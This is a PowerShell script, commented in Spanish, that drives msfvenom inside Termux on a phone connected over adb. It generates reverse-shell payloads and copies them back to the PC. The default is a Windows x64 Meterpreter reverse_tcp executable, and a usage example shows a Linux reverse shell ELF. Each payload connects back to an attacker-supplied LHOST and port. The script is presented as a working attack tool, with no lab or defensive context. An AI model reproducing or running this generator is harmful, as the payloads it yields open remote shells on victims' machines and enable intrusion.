<#
.SYNOPSIS
    Generar payloads con msfvenom desde el teléfono
.EXAMPLE
    .\payload.ps1 -LHOST 192.168.0.5 -LPORT 4444 -Format exe
    .\payload.ps1 -LHOST 10.0.0.1 -LPORT 443 -Type linux/x64/shell_reverse_tcp -Format elf
#>
param(
    [Parameter(Mandatory)][string]$LHOST,
    [int]$LPORT = 4444,
    [string]$Type = "windows/x64/meterpreter/reverse_tcp",
    [string]$Format = "exe",
    [string]$Output = "payload"
)

$ADB = "$env:LOCALAPPDATA\Android\Sdk\platform-tools\adb.exe"
$PHONE = "VGL7MVFMDYQG8T55"
$OutName = "$Output.$Format"

Write-Host "`n  ╔══════════════════════════════════╗" -ForegroundColor Magenta
Write-Host "  ║     MSFVENOM PAYLOAD GENERATOR    ║" -ForegroundColor Magenta
Write-Host "  ╚══════════════════════════════════╝`n" -ForegroundColor Magenta

Write-Host "  LHOST : $LHOST" -ForegroundColor Yellow
Write-Host "  LPORT : $LPORT" -ForegroundColor Yellow
Write-Host "  Type  : $Type" -ForegroundColor Yellow
Write-Host "  Format: $Format" -ForegroundColor Yellow
Write-Host ""

$cmd = "msfvenom -p $Type LHOST=$LHOST LPORT=$LPORT -f $Format -o /sdcard/$OutName 2>&1"
Write-Host "  Comando: $cmd" -ForegroundColor Gray
Write-Host ""

$result = & $ADB -s $PHONE shell "run-as com.termux /data/data/com.termux/files/usr/bin/bash -c `"PATH=/data/data/com.termux/files/usr/bin proot-distro login ubuntu -- $cmd`"" 2>&1
Write-Host $result

# Pull payload
Write-Host "`n  Descargando payload..." -ForegroundColor Yellow
& $ADB -s $PHONE pull "/sdcard/$OutName" "$PSScriptRoot\$OutName" 2>&1
Write-Host "  Payload guardado: $PSScriptRoot\$OutName" -ForegroundColor Green
Write-Host "`n  ═══════════════════════════════════`n" -ForegroundColor Magenta
